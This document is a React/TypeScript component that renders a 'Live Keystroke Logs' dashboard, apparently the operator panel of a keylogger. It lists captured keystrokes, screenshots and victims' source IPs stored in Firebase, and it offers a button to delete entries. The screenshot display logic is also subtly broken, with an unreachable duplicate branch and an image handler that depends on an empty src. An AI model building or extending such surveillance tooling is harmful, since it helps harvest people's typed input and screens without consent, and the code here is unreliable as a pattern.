import React, { useState } from 'react';
import { doc, deleteDoc } from 'firebase/firestore';
import { getDownloadURL, ref } from 'firebase/storage';
import { storage } from '../config/firebase';
import { db } from '../config/firebase';
import { KeystrokeLog } from '../types/KeystrokeLog';
import { Clock, Globe, Type, Activity, Zap, Trash2, AlertTriangle } from 'lucide-react';
import ScreenshotRenderer from './ScreenshotRenderer';

interface LogsTableProps {
  logs: KeystrokeLog[];
  loading: boolean;
}

const LogsTable: React.FC<LogsTableProps> = ({ logs, loading }) => {
  const [deletingIds, setDeletingIds] = useState<Set<string>>(new Set());
  const [showDeleteConfirm, setShowDeleteConfirm] = useState<string | null>(null);

  const formatTimestamp = (timestamp: Date) => {
    return new Intl.DateTimeFormat('en-US', {
      year: 'numeric',
      month: 'short',
      day: 'numeric',
      hour: '2-digit',
      minute: '2-digit',
      second: '2-digit',
    }).format(timestamp);
  };

  const getTimeAgo = (timestamp: Date) => {
    const now = new Date();
    const diff = now.getTime() - timestamp.getTime();
    const minutes = Math.floor(diff / 60000);
    const hours = Math.floor(diff / 3600000);
    const days = Math.floor(diff / 86400000);

    if (days > 0) return `${days}d ago`;
    if (hours > 0) return `${hours}h ago`;
    if (minutes > 0) return `${minutes}m ago`;
    return 'Just now';
  };

  const handleDelete = async (logId: string) => {
    setDeletingIds(prev => new Set(prev).add(logId));
    try {
      await deleteDoc(doc(db, 'keystrokes', logId));
      // Success - the real-time listener will automatically update the UI
    } catch (error) {
      console.error('Error deleting log:', error);
      // You could add a toast notification here
    } finally {
      setDeletingIds(prev => {
        const newSet = new Set(prev);
        newSet.delete(logId);
        return newSet;
      });
      setShowDeleteConfirm(null);
    }
  };

  const DeleteConfirmModal = ({ logId, onConfirm, onCancel }: {
    logId: string;
    onConfirm: () => void;
    onCancel: () => void;
  }) => (
    <div className="fixed inset-0 bg-black/50 backdrop-blur-sm flex items-center justify-center z-50 p-4">
      <div className="bg-white/90 backdrop-blur-xl rounded-3xl shadow-2xl border border-white/20 p-8 max-w-md w-full transform animate-in zoom-in-95 duration-200">
        <div className="text-center">
          <div className="bg-red-100 w-16 h-16 rounded-2xl flex items-center justify-center mx-auto mb-4">
            <AlertTriangle className="w-8 h-8 text-red-600" />
          </div>
          <h3 className="text-xl font-bold text-gray-900 mb-2">Delete Log Entry</h3>
          <p className="text-gray-600 mb-6">
            Are you sure you want to delete this keystroke log? This action cannot be undone.
          </p>
          <div className="flex gap-3">
            <button
              onClick={onCancel}
              className="flex-1 px-6 py-3 bg-gray-100 hover:bg-gray-200 text-gray-700 rounded-2xl transition-all duration-200 font-medium"
            >
              Cancel
            </button>
            <button
              onClick={onConfirm}
              className="flex-1 px-6 py-3 bg-gradient-to-r from-red-500 to-red-600 hover:from-red-600 hover:to-red-700 text-white rounded-2xl transition-all duration-200 font-medium shadow-lg hover:shadow-xl"
            >
              Delete
            </button>
          </div>
        </div>
      </div>
    </div>
  );

  if (loading) {
    return (
      <div className="bg-white/80 backdrop-blur-xl rounded-3xl shadow-2xl border border-white/20 overflow-hidden">
        <div className="p-8">
          <div className="animate-pulse">
            <div className="flex items-center gap-3 mb-6">
              <div className="w-8 h-8 bg-gradient-to-r from-purple-400 to-cyan-400 rounded-xl"></div>
              <div className="h-6 bg-gray-200 rounded-lg w-1/4"></div>
            </div>
            <div className="space-y-4">
              {[...Array(5)].map((_, i) => (
                <div key={i} className="bg-gray-50 rounded-2xl p-4">
                  <div className="grid grid-cols-4 gap-4">
                    <div className="h-4 bg-gray-200 rounded-lg"></div>
                    <div className="h-4 bg-gray-200 rounded-lg"></div>
                    <div className="h-4 bg-gray-200 rounded-lg"></div>
                    <div className="h-4 bg-gray-200 rounded-lg"></div>
                  </div>
                </div>
              ))}
            </div>
          </div>
        </div>
      </div>
    );
  }

  if (logs.length === 0) {
    return (
      <div className="bg-white/80 backdrop-blur-xl rounded-3xl shadow-2xl border border-white/20 p-12 text-center">
        <div className="relative mb-6">
          <div className="bg-gradient-to-r from-purple-500 to-cyan-500 w-20 h-20 rounded-2xl flex items-center justify-center mx-auto shadow-lg">
            <Type className="w-10 h-10 text-white" />
          </div>
          <div className="absolute -top-2 -right-2 w-6 h-6 bg-yellow-400 rounded-full border-2 border-white animate-bounce"></div>
        </div>
        <h3 className="text-2xl font-bold text-gray-900 mb-3">No keystroke logs found</h3>
        <p className="text-gray-600 mb-6">Logs will appear here when keystrokes are captured.</p>
        <div className="flex items-center justify-center gap-2 text-sm text-gray-500">
          <Activity className="w-4 h-4" />
          <span>Monitoring active</span>
        </div>
      </div>
    );
  }

  return (
    <>
      <div className="bg-white/80 backdrop-blur-xl rounded-3xl shadow-2xl border border-white/20 overflow-hidden">
        {/* Header */}
        <div className="bg-gradient-to-r from-purple-600 to-cyan-600 p-6">
          <div className="flex items-center gap-3">
            <div className="bg-white/20 p-2 rounded-xl">
              <Zap className="w-6 h-6 text-white" />
            </div>
            <div>
              <h2 className="text-xl font-bold text-white">Live Keystroke Logs</h2>
              <p className="text-purple-100 text-sm">{logs.length} entries captured</p>
            </div>
          </div>
        </div>

        <div className="overflow-x-auto">
          <table className="min-w-full">
            <thead className="bg-gray-50/80 backdrop-blur-sm">
              <tr>
                <th className="px-6 py-4 text-left text-xs font-semibold text-gray-600 uppercase tracking-wider">
                  <div className="flex items-center gap-2">
                    <Clock className="w-4 h-4 text-purple-500" />
                    Timestamp
                  </div>
                </th>
                <th className="px-6 py-4 text-left text-xs font-semibold text-gray-600 uppercase tracking-wider">
                  <div className="flex items-center gap-2">
                    <Globe className="w-4 h-4 text-cyan-500" />
                    Source IP
                  </div>
                </th>
                <th className="px-6 py-4 text-left text-xs font-semibold text-gray-600 uppercase tracking-wider">
                  <div className="flex items-center gap-2">
                    <Type className="w-4 h-4 text-green-500" />
                    Captured Content
                  </div>
                </th>
                <th className="px-6 py-4 text-left text-xs font-semibold text-gray-600 uppercase tracking-wider">
                  <div className="flex items-center gap-2">
                    <Trash2 className="w-4 h-4 text-red-500" />
                    Actions
                  </div>
                </th>
              </tr>
            </thead>
            <tbody className="divide-y divide-gray-100">
              {logs.map((log, index) => (
                <tr
                  key={log.id}
                  className="hover:bg-purple-50/50 transition-all duration-300 group"
                  style={{ animationDelay: `${index * 50}ms` }}
                >
                  <td className="px-6 py-4 whitespace-nowrap">
                    <div className="flex flex-col">
                      <span className="text-sm font-medium text-gray-900">
                        {formatTimestamp(log.timestamp)}
                      </span>
                      <span className="text-xs text-gray-500 flex items-center gap-1">
                        <div className="w-2 h-2 bg-green-400 rounded-full animate-pulse"></div>
                        {getTimeAgo(log.timestamp)}
                      </span>
                    </div>
                  </td>
                  <td className="px-6 py-4 whitespace-nowrap">
                    <div className="flex items-center gap-2">
                      <div className="w-2 h-2 bg-cyan-400 rounded-full"></div>
                      <span className="inline-flex items-center px-3 py-1 rounded-full text-xs font-medium bg-gradient-to-r from-cyan-100 to-blue-100 text-cyan-800 border border-cyan-200">
                        {log.ip}
                      </span>
                    </div>
                  </td>
                  <td className="px-6 py-4">
                    <div className="max-w-md">
                      <div className="bg-gray-50 rounded-xl p-3 group-hover:bg-purple-50 transition-colors">
                        {log.type === 'screenshot' ? (
                          <img
                            src=""
                            alt="Screenshot"
                            className="rounded-lg max-w-xs border border-gray-200 shadow-md"
                            style={{ maxHeight: '300px' }}
                            onLoad={async (e) => {
                              try {
                                const url = await getDownloadURL(ref(storage, log.content));
                                (e.target as HTMLImageElement).src = url;
                              } catch (error) {
                                console.error('❌ Invalid screenshot URL:', log.content, error);
                                (e.target as HTMLImageElement).alt = 'Invalid or restricted screenshot';
                              }
                            }}
                            onError={(e) => {
                              console.error('❌ Image load failed');
                              (e.target as HTMLImageElement).alt = 'Failed to load image';
                            }}
                          />
                        ) : (

                          log.type === 'screenshot' ? (
                            <ScreenshotRenderer content={log.content} />
                          ) : (
                            <span className="text-sm text-gray-900 font-mono break-all">
                              {log.content}
                            </span>
                          )

                        )}
                      </div>
                    </div>
                  </td>


                  <td className="px-6 py-4 whitespace-nowrap">
                    <button
                      onClick={() => setShowDeleteConfirm(log.id)}
                      disabled={deletingIds.has(log.id)}
                      className="group/btn relative inline-flex items-center gap-2 px-4 py-2 bg-red-50 hover:bg-red-100 text-red-600 hover:text-red-700 rounded-xl transition-all duration-200 disabled:opacity-50 disabled:cursor-not-allowed border border-red-200 hover:border-red-300 shadow-sm hover:shadow-md"
                    >
                      {deletingIds.has(log.id) ? (
                        <>
                          <div className="w-4 h-4 border-2 border-red-600 border-t-transparent rounded-full animate-spin" />
                          <span className="text-sm font-medium">Deleting...</span>
                        </>
                      ) : (
                        <>
                          <Trash2 className="w-4 h-4 group-hover/btn:scale-110 transition-transform" />
                          <span className="text-sm font-medium">Delete</span>
                        </>
                      )}
                    </button>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </div>

      {/* Delete Confirmation Modal */}
      {showDeleteConfirm && (
        <DeleteConfirmModal
          logId={showDeleteConfirm}
          onConfirm={() => handleDelete(showDeleteConfirm)}
          onCancel={() => setShowDeleteConfirm(null)}
        />
      )}
    </>
  );
};

export default LogsTable;